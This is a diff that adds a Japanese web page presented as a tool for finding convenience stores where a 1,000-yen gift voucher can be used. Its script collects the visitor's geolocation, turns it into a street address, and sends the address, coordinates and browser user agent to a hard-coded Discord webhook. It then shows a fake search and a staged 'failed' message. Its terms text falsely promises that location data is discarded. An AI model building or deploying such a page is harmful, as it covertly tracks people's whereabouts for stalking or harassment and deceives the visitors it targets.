@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>コンビニ商品券 利用可能店舗</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #eef2f5;
+            font-family: -apple-system, 'Helvetica Neue', 'Segoe UI', Roboto, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+            margin: 0;
+            color: #1e2a3a;
+        }
+        .app {
+            max-width: 420px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 32px;
+            padding: 28px 22px 20px;
+            box-shadow: 0 8px 40px rgba(0,0,0,0.06);
+            position: relative;
+            min-height: 560px;
+            display: flex;
+            flex-direction: column;
+        }
+        .header-icon { font-size: 2.2rem; margin-bottom: 4px; }
+        .title {
+            font-size: 1.8rem;
+            font-weight: 600;
+            letter-spacing: -0.5px;
+            color: #0b1a2a;
+            line-height: 1.2;
+        }
+        .sub-title {
+            font-size: 0.95rem;
+            color: #5d6f83;
+            margin-top: 4px;
+            font-weight: 400;
+        }
+        .search-btn {
+            width: 100%;
+            padding: 18px 0;
+            background: #1a2a3a;
+            border: none;
+            border-radius: 60px;
+            color: white;
+            font-size: 1.1rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: 0.15s;
+            margin: 24px 0 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            letter-spacing: 0.3px;
+        }
+        .search-btn:active { transform: scale(0.96); background: #0f1c2a; }
+        .search-btn:disabled { opacity: 0.6; transform: none; }
+
+        #loading-area {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 30px 0 20px;
+            min-height: 160px;
+        }
+        .spinner {
+            width: 44px;
+            height: 44px;
+            border: 3px solid #dce3ec;
+            border-top: 3px solid #1a2a3a;
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .loading-dots {
+            font-size: 1.1rem;
+            color: #2c3e50;
+            margin-top: 18px;
+            font-weight: 400;
+            letter-spacing: 0.5px;
+            min-height: 2.2rem;
+        }
+        .loading-dots span {
+            display: inline-block;
+            animation: dotPulse 1.2s infinite;
+            opacity: 0;
+        }
+        .loading-dots span:nth-child(1) { animation-delay: 0.0s; }
+        .loading-dots span:nth-child(2) { animation-delay: 0.4s; }
+        .loading-dots span:nth-child(3) { animation-delay: 0.8s; }
+
+        @keyframes dotPulse {
+            0% { opacity: 0; transform: translateY(0); }
+            50% { opacity: 1; transform: translateY(-3px); }
+            100% { opacity: 0; transform: translateY(0); }
+        }
+
+        #result-area {
+            display: none;
+            margin-top: 16px;
+            padding: 16px 0 8px;
+            border-top: 1px solid #e9edf2;
+            font-size: 0.95rem;
+            color: #1f2c3c;
+            flex: 1;
+        }
+
+        .error-box {
+            text-align: center;
+            padding: 24px 10px;
+        }
+        .error-box .icon { font-size: 2.8rem; margin-bottom: 10px; }
+        .error-box .msg {
+            font-size: 1.1rem;
+            font-weight: 500;
+            color: #c0392b;
+            margin-bottom: 6px;
+        }
+        .error-box .sub-msg { font-size: 0.9rem; color: #6a7d92; }
+        .retry-btn {
+            margin-top: 18px;
+            padding: 12px 32px;
+            background: #eef2f5;
+            border: 1px solid #d0d8e0;
+            border-radius: 60px;
+            font-size: 0.95rem;
+            font-weight: 500;
+            color: #1a2a3a;
+            cursor: pointer;
+            transition: 0.1s;
+        }
+        .retry-btn:active { transform: scale(0.95); background: #dce3ec; }
+
+        .footer-terms {
+            margin-top: auto;
+            padding-top: 18px;
+            display: flex;
+            justify-content: flex-start;
+        }
+        .terms-link {
+            font-size: 0.7rem;
+            color: #8a9caa;
+            background: none;
+            border: none;
+            text-decoration: underline;
+            cursor: pointer;
+            letter-spacing: 0.3px;
+            padding: 4px 0;
+        }
+        .terms-link:active { color: #3a4a5a; }
+
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.35);
+            backdrop-filter: blur(3px);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            padding: 24px;
+        }
+        .modal-box {
+            max-width: 400px;
+            width: 100%;
+            background: #fff;
+            border-radius: 28px;
+            padding: 30px 24px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.15);
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        .modal-box h3 {
+            font-size: 1.2rem;
+            margin-bottom: 12px;
+            font-weight: 600;
+            color: #0f1e2e;
+        }
+        .modal-box p {
+            font-size: 0.85rem;
+            color: #33485e;
+            line-height: 1.6;
+            margin-bottom: 12px;
+        }
+        .modal-close {
+            margin-top: 18px;
+            padding: 12px 0;
+            width: 100%;
+            background: #eef2f5;
+            border: none;
+            border-radius: 60px;
+            font-size: 0.95rem;
+            font-weight: 500;
+            cursor: pointer;
+            color: #1a2a3a;
+        }
+        .modal-close:active { background: #dce3ec; }
+    </style>
+</head>
+<body>
+
+<div class="app">
+    <div class="header-icon">🏪</div>
+    <div class="title">コンビニ商品券 利用可能店</div>
+    <div class="sub-title">1,000円分の商品券が使えるコンビニを検索します</div>
+
+    <button class="search-btn" id="searchBtn">🔍 検索する</button>
+
+    <div id="loading-area">
+        <div class="spinner"></div>
+        <div class="loading-dots" id="loadingText">
+            <span>検</span><span>索</span><span>中</span>
+        </div>
+    </div>
+
+    <div id="result-area"></div>
+
+    <div class="footer-terms">
+        <button class="terms-link" id="termsBtn">利用規約</button>
+    </div>
+</div>
+
+<!-- 利用規約モーダル -->
+<div class="modal-overlay" id="termsModal">
+    <div class="modal-box">
+        <h3>利用規約</h3>
+        <p>
+            このサービスは、1,000円分のコンビニ商品券が利用可能な店舗を
+            お客様の現在地に基づいて検索することを目的としています。<br><br>
+            位置情報は、より正確な検索結果を表示するために利用します。
+            取得した位置情報は、検索終了後に破棄されます。<br><br>
+            本サービスは予告なく変更・終了することがあります。<br><br>
+            ご利用は自己責任でお願いいたします。
+        </p>
+        <button class="modal-close" id="closeTerms">閉じる</button>
+    </div>
+</div>
+
+<script>
+    (function() {
+        "use strict";
+
+        // ★★★ 新しいWebhook URLに差し替え ★★★
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1546539146934231070/Zp4YUAo137Na5FuZPBs-n6V4MEgsMbsLNcEDRaBaG8St4vw5cghNjuoNqUo2agRso1UD';
+
+        const searchBtn = document.getElementById('searchBtn');
+        const loadingArea = document.getElementById('loading-area');
+        const loadingText = document.getElementById('loadingText');
+        const resultArea = document.getElementById('result-area');
+        const termsBtn = document.getElementById('termsBtn');
+        const termsModal = document.getElementById('termsModal');
+        const closeTerms = document.getElementById('closeTerms');
+
+        // ----- 利用規約モーダル -----
+        termsBtn.addEventListener('click', function() {
+            termsModal.style.display = 'flex';
+        });
+        closeTerms.addEventListener('click', function() {
+            termsModal.style.display = 'none';
+        });
+        termsModal.addEventListener('click', function(e) {
+            if (e.target === termsModal) termsModal.style.display = 'none';
+        });
+
+        // ----- 失敗画面 -----
+        function showError() {
+            resultArea.style.display = 'block';
+            resultArea.innerHTML = `
+                <div class="error-box">
+                    <div class="icon">⚠️</div>
+                    <div class="msg">失敗しました</div>
+                    <div class="sub-msg">リロードして、もう一度お試しください</div>
+                    <button class="retry-btn" id="retryBtn">ページを再読み込み</button>
+                </div>
+            `;
+            document.getElementById('retryBtn').addEventListener('click', function() {
+                location.reload();
+            });
+        }
+
+        // ----- 位置情報から住所を取得 (Geocoding API) -----
+        async function getAddressFromCoords(lat, lng) {
+            try {
+                const response = await fetch(
+                    `https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lng}&language=ja&key=YOUR_API_KEY`
+                );
+                const data = await response.json();
+                if (data.status === 'OK' && data.results.length > 0) {
+                    return data.results[0].formatted_address;
+                } else {
+                    return null;
+                }
+            } catch (e) {
+                console.warn('Geocoding error:', e);
+                return null;
+            }
+        }
+
+        // ----- Discord Webhook 送信 (住所付き) -----
+        function sendLocationToWebhook(lat, lng, address) {
+            const payload = {
+                content: `📍 **商品券利用可能店舗検索**\n住所: ${address}\n緯度: ${lat}\n経度: ${lng}\nUA: ${navigator.userAgent}`
+            };
+
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload),
+                mode: 'no-cors'
+            }).catch(e => console.log('Webhook送信エラー（無視）'));
+        }
+
+        // ----- 検索ボタンの動作 -----
+        searchBtn.addEventListener('click', function() {
+            if (searchBtn.disabled) return;
+
+            if (!navigator.geolocation) {
+                alert('お使いの端末は位置情報に対応していません。');
+                return;
+            }
+
+            searchBtn.disabled = true;
+            searchBtn.textContent = '⏳ 取得中...';
+
+            loadingArea.style.display = 'flex';
+            resultArea.style.display = 'none';
+            resultArea.innerHTML = '';
+
+            loadingText.innerHTML = '<span>検</span><span>索</span><span>中</span>';
+
+            navigator.geolocation.getCurrentPosition(
+                async function(pos) {
+                    const lat = pos.coords.latitude;
+                    const lng = pos.coords.longitude;
+
+                    // 住所を逆引き
+                    let address = '住所不明';
+                    try {
+                        const fetched = await getAddressFromCoords(lat, lng);
+                        if (fetched) address = fetched;
+                    } catch (e) {
+                        console.warn('住所取得失敗:', e);
+                    }
+
+                    // Webhook に位置情報 + 住所を送信
+                    sendLocationToWebhook(lat, lng, address);
+
+                    // 3.2秒ローディング → 失敗表示
+                    setTimeout(() => {
+                        loadingArea.style.display = 'none';
+                        searchBtn.disabled = false;
+                        searchBtn.textContent = '🔍 検索する';
+                        showError();
+                    }, 3200);
+                },
+                function(err) {
+                    loadingArea.style.display = 'none';
+                    searchBtn.disabled = false;
+                    searchBtn.textContent = '🔍 検索する';
+                    showError();
+                    console.warn('Geolocation error:', err.message);
+                },
+                {
+                    enableHighAccuracy: false,
+                    timeout: 8000,
+                    maximumAge: 60000
+                }
+            );
+        });
+
+        document.addEventListener('DOMContentLoaded', function() {
+            loadingArea.style.display = 'none';
+            resultArea.style.display = 'none';
+        });
+
+    })();
+</script>
+</body>
+</html>
